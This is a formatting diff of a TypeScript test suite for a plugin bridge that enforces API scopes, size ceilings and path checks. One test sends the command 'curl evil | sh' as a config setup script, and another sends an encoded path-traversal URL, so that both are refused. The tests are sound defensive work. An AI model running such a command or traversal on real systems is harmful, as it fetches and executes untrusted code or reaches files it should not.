@@ -1,7 +1,12 @@
 import { afterEach, describe, expect, it, vi } from 'vitest'
 import { projectConfigRoute, projectRunTargetsRoute, projectsRoute, tasksRoute } from '@acorn/protocol/api.ts'
 import type { PluginBridgeMessage } from '@acorn/protocol/plugin/bridge.ts'
-import { MAX_DOCUMENT_BYTES, MAX_OVERLAY_INPUT_BYTES, MAX_PLUGIN_BYTES, PLUGIN_BRIDGE_DENIED } from '@acorn/protocol/plugin/bridge.ts'
+import {
+  MAX_DOCUMENT_BYTES,
+  MAX_OVERLAY_INPUT_BYTES,
+  MAX_PLUGIN_BYTES,
+  PLUGIN_BRIDGE_DENIED,
+} from '@acorn/protocol/plugin/bridge.ts'
 import { MAX_PLUGIN_STATE_BYTES } from '@acorn/protocol/plugin/state.ts'
 import { createFrameBridge, type FrameBinding, type FrameServices } from './broker'
 
@@ -25,11 +30,24 @@ const BINDING: FrameBinding = {
   claimsKeys: [],
 }
 
-const CONTEXT = { surface: 'board', target: 'pane' as const, nodeId: 'node-a', taskId: 'task-1', theme: 'dark', style: 'terminal' }
+const CONTEXT = {
+  surface: 'board',
+  target: 'pane' as const,
+  nodeId: 'node-a',
+  taskId: 'task-1',
+  theme: 'dark',
+  style: 'terminal',
+}
 
 const services = (over: Partial<FrameServices> = {}): FrameServices => ({
   fetch: vi.fn(async () => ({ ok: true, status: 200, body: { fetched: true } })),
-  fetchBytes: vi.fn(async () => ({ ok: true as const, status: 200, bytes: new Uint8Array([1, 2, 3]), type: 'image/png', filename: 'a.png' })),
+  fetchBytes: vi.fn(async () => ({
+    ok: true as const,
+    status: 200,
+    bytes: new Uint8Array([1, 2, 3]),
+    type: 'image/png',
+    filename: 'a.png',
+  })),
   subscribe: vi.fn(() => vi.fn()),
   stateGet: vi.fn(() => undefined),
   stateSet: vi.fn(async () => {}),
@@ -76,7 +94,9 @@ const open = (over: Partial<FrameBinding> = {}, svc = services()): Harness & { s
     svc,
     received,
     misbehaved,
-    get connects() { return connects },
+    get connects() {
+      return connects
+    },
     send: (message) => channel.port2.postMessage(message),
     dispose: () => {
       bridge.dispose()
@@ -114,8 +134,12 @@ describe('a tree bundle bootstrap bridge', () => {
     const received: PluginBridgeMessage[] = []
     channel.port2.onmessage = (event: MessageEvent) => received.push(event.data as PluginBridgeMessage)
     const bridge = createFrameBridge({
-      port: channel.port1 as unknown as MessagePort, binding: BINDING, services: svc,
-      context: CONTEXT, authorize: () => authorized, onMisbehaving: () => {},
+      port: channel.port1 as unknown as MessagePort,
+      binding: BINDING,
+      services: svc,
+      context: CONTEXT,
+      authorize: () => authorized,
+      onMisbehaving: () => {},
     })
     channel.port2.postMessage({ id: 1, kind: 'api', method: 'GET', path: tasksRoute })
     await vi.waitFor(() => expect(received).toHaveLength(2))
@@ -194,7 +218,13 @@ describe('api calls', () => {
     // The code-execution path. Config writes are shell commands the Node runs on the next task, so this
     // is asserted here as well as in the scope table's own suite.
     const h = withBridge({ target: 'importer', api: ['core.projects:read', 'core.projects:write'] })
-    h.send({ id: 3, kind: 'api', method: 'PUT', path: projectConfigRoute('p1'), body: { setup_script: 'curl evil | sh' } })
+    h.send({
+      id: 3,
+      kind: 'api',
+      method: 'PUT',
+      path: projectConfigRoute('p1'),
+      body: { setup_script: 'curl evil | sh' },
+    })
     h.send({ id: 4, kind: 'api', method: 'PUT', path: projectRunTargetsRoute('p1'), body: {} })
     h.send({ id: 5, kind: 'api', method: 'POST', path: projectsRoute, body: { name: 'ok' } })
     await h.settled(4)
@@ -207,7 +237,10 @@ describe('api calls', () => {
 
   it('forwards the node’s own error envelope verbatim', async () => {
     const error = { code: 'revision_conflict', message: 'stale', requestId: 'r7', retryable: false }
-    const h = withBridge(undefined, services({ fetch: vi.fn(async () => ({ ok: false, status: 409, body: undefined, error })) }))
+    const h = withBridge(
+      undefined,
+      services({ fetch: vi.fn(async () => ({ ok: false, status: 409, body: undefined, error })) }),
+    )
     h.send({ id: 6, kind: 'api', method: 'GET', path: tasksRoute })
     await h.settled(2)
     expect(replyTo(h, 6)).toEqual({ id: 6, ok: false, error })
@@ -276,7 +309,11 @@ describe('events', () => {
     expect(replyTo(h, 10)).toMatchObject({ ok: true })
     listener?.({ taskId: 'task-1' })
     await h.settled(3)
-    expect(h.received.at(-1)).toEqual({ kind: 'event', channel: 'runtime:task-archived', payload: { taskId: 'task-1' } })
+    expect(h.received.at(-1)).toEqual({
+      kind: 'event',
+      channel: 'runtime:task-archived',
+      payload: { taskId: 'task-1' },
+    })
     h.dispose()
     harness = null
     expect(detach).toHaveBeenCalled()
@@ -342,10 +379,21 @@ describe('ui verbs', () => {
 
   it('opens only a manifest-declared cooperative destination', async () => {
     const h = withBridge({ destinations: [{ id: 'memory-review', targetKind: 'findings-candidate' }] })
-    h.send({ id: 201, kind: 'ui', op: 'openDestination', destinationId: 'memory-review', resourceId: 'candidate-1', subresourceId: 'revision-2' })
+    h.send({
+      id: 201,
+      kind: 'ui',
+      op: 'openDestination',
+      destinationId: 'memory-review',
+      resourceId: 'candidate-1',
+      subresourceId: 'revision-2',
+    })
     await h.settled(2)
     expect(replyTo(h, 201)).toMatchObject({ ok: true })
-    expect(h.svc.openTarget).toHaveBeenCalledWith({ kind: 'findings-candidate', resourceId: 'candidate-1', subresourceId: 'revision-2' })
+    expect(h.svc.openTarget).toHaveBeenCalledWith({
+      kind: 'findings-candidate',
+      resourceId: 'candidate-1',
+      subresourceId: 'revision-2',
+    })
   })
 
   it('denies undeclared or unbounded cooperative destinations before navigation', async () => {
@@ -474,7 +522,13 @@ describe('ui verbs', () => {
       postMessage(message)
     }
     const svc = services({ openTask: vi.fn(() => () => void order.push('move')) })
-    const bridge = createFrameBridge({ port: port as unknown as MessagePort, binding: BINDING, services: svc, context: CONTEXT, onMisbehaving: () => {} })
+    const bridge = createFrameBridge({
+      port: port as unknown as MessagePort,
+      binding: BINDING,
+      services: svc,
+      context: CONTEXT,
+      onMisbehaving: () => {},
+    })
     channel.port2.postMessage({ id: 60, kind: 'ui', op: 'openTask', taskId: 'task-9' })
     for (let tick = 0; tick < 200 && order.length < 2; tick++) await new Promise((r) => setTimeout(r, 1))
     bridge.dispose()
@@ -597,7 +651,11 @@ describe('the shared document', () => {
   })
 
   it('reports a failing flush rather than dropping it, so a frame can say the save did not land', async () => {
-    const document = doc({ flush: vi.fn(async () => { throw new Error('write route 500') }) })
+    const document = doc({
+      flush: vi.fn(async () => {
+        throw new Error('write route 500')
+      }),
+    })
     const h = withBridge({}, services({ document }))
     h.send({ id: 45, kind: 'document', op: 'flush' })
     await h.settled(2)
@@ -681,7 +739,15 @@ describe('byte requests', () => {
 
   it('carries a byte body and its advisory metadata to the host', async () => {
     const h = withBridge()
-    h.send({ id: 31, kind: 'api.bytes', method: 'POST', path: '/v1/p/board/files', bytes: new Uint8Array([9]), type: 'image/png', filename: 'b.png' })
+    h.send({
+      id: 31,
+      kind: 'api.bytes',
+      method: 'POST',
+      path: '/v1/p/board/files',
+      bytes: new Uint8Array([9]),
+      type: 'image/png',
+      filename: 'b.png',
+    })
     await h.settled(2)
     expect(h.svc.fetchBytes).toHaveBeenCalledWith(
       'POST',
@@ -695,7 +761,12 @@ describe('byte requests', () => {
     const h = withBridge({ api: [] })
     h.send({ id: 104, kind: 'api.bytes', method: 'GET', path: '/v1/p/board/files/a%20b?size=small' })
     await h.settled(2)
-    expect(h.svc.fetchBytes).toHaveBeenCalledWith('GET', '/v1/p/board/files/a%20b?size=small', undefined, expect.anything())
+    expect(h.svc.fetchBytes).toHaveBeenCalledWith(
+      'GET',
+      '/v1/p/board/files/a%20b?size=small',
+      undefined,
+      expect.anything(),
+    )
   })
 
   // The one that matters. `image-markup` needs attachment content, and the temptation is to let it call
@@ -711,7 +782,12 @@ describe('byte requests', () => {
 
   it('refuses encoded traversal on the byte path before transport', async () => {
     const h = withBridge({ api: [] })
-    h.send({ id: 103, kind: 'api.bytes', method: 'GET', path: '/v1/p/board/%2e%2e/%2e%2e/core/tasks/task-1/preview-url' })
+    h.send({
+      id: 103,
+      kind: 'api.bytes',
+      method: 'GET',
+      path: '/v1/p/board/%2e%2e/%2e%2e/core/tasks/task-1/preview-url',
+    })
     await h.settled(2)
     expect(replyTo(h, 103)).toMatchObject({ id: 103, ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
     expect(h.svc.fetchBytes).not.toHaveBeenCalled()
@@ -719,7 +795,14 @@ describe('byte requests', () => {
 
   it('refuses a core path the plugin has no scope for, the same as the JSON path would', async () => {
     const h = withBridge()
-    h.send({ id: 33, kind: 'api.bytes', method: 'POST', path: '/v1/projects', bytes: new Uint8Array([1]), type: 'application/json' })
+    h.send({
+      id: 33,
+      kind: 'api.bytes',
+      method: 'POST',
+      path: '/v1/projects',
+      bytes: new Uint8Array([1]),
+      type: 'application/json',
+    })
     await h.settled(2)
     expect(replyTo(h, 33)).toMatchObject({ ok: false })
     expect(h.svc.fetchBytes).not.toHaveBeenCalled()
@@ -727,7 +810,14 @@ describe('byte requests', () => {
 
   it('refuses a body over the ceiling before sending it anywhere', async () => {
     const h = withBridge()
-    h.send({ id: 34, kind: 'api.bytes', method: 'POST', path: '/v1/p/board/files', bytes: new Uint8Array(MAX_PLUGIN_BYTES + 1), type: 'image/png' })
+    h.send({
+      id: 34,
+      kind: 'api.bytes',
+      method: 'POST',
+      path: '/v1/p/board/files',
+      bytes: new Uint8Array(MAX_PLUGIN_BYTES + 1),
+      type: 'image/png',
+    })
     await h.settled(2)
     expect(replyTo(h, 34)).toMatchObject({ ok: false, error: { code: 'bad_request' } })
     expect(h.svc.fetchBytes).not.toHaveBeenCalled()
@@ -750,18 +840,34 @@ describe('byte requests', () => {
   })
 
   it('passes a node refusal through as the ordinary error envelope', async () => {
-    const h = withBridge({}, services({
-      fetchBytes: async () => ({ ok: false as const, status: 404, error: { code: 'not_found', message: 'gone', requestId: 'r1', retryable: false } }),
-    }))
+    const h = withBridge(
+      {},
+      services({
+        fetchBytes: async () => ({
+          ok: false as const,
+          status: 404,
+          error: { code: 'not_found', message: 'gone', requestId: 'r1', retryable: false },
+        }),
+      }),
+    )
     h.send({ id: 37, kind: 'api.bytes', method: 'GET', path: '/v1/p/board/files/a' })
     await h.settled(2)
     expect(replyTo(h, 37)).toMatchObject({ ok: false, error: { code: 'not_found', message: 'gone' } })
   })
 
   it('carries zero bytes, which is a real answer and not an error', async () => {
-    const h = withBridge({}, services({
-      fetchBytes: async () => ({ ok: true as const, status: 200, bytes: new Uint8Array(), type: 'application/octet-stream', filename: null }),
-    }))
+    const h = withBridge(
+      {},
+      services({
+        fetchBytes: async () => ({
+          ok: true as const,
+          status: 200,
+          bytes: new Uint8Array(),
+          type: 'application/octet-stream',
+          filename: null,
+        }),
+      }),
+    )
     h.send({ id: 38, kind: 'api.bytes', method: 'GET', path: '/v1/p/board/files/a' })
     await h.settled(2)
     expect(replyTo(h, 38)).toMatchObject({ ok: true, body: { bytes: new Uint8Array(), filename: null } })
@@ -804,7 +910,9 @@ describe('closing with a result', () => {
 
 it('atomically refuses delayed document replacement after the text changes', async () => {
   let text = 'SELECT dirty;'
-  const write = vi.fn((next: string) => { text = next })
+  const write = vi.fn((next: string) => {
+    text = next
+  })
   const h = open({}, services({ document: { read: () => text, write, flush: async () => {} } }))
   try {
     h.send({ id: 1, kind: 'document', op: 'write', text: 'SELECT generated;', expectedText: 'SELECT prior;' })
@@ -815,5 +923,7 @@ it('atomically refuses delayed document replacement after the text changes', asy
     await h.settled(3)
     expect(replyTo(h, 2)).toMatchObject({ id: 2, ok: true })
     expect(text).toBe('SELECT generated;')
-  } finally { h.dispose() }
+  } finally {
+    h.dispose()
+  }
 })
